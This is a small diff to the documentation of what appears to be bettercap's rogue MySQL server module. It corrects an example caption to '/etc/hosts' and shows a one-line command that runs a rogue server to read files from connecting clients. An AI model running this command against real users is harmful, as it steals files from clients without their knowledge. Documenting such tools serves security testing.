@@ -26,7 +26,7 @@ Stop mysql server.
 
 ### Examples
 
-One liner to start the server and steal /etc/passwd from clients connecting to your Rogue MySQL server
+One liner to start the server and steal `/etc/hosts` from clients connecting to your Rogue MySQL server
 
 ```bash
 sudo bettercap -eval "set mysql.server.infile /etc/hosts; mysql.server on"
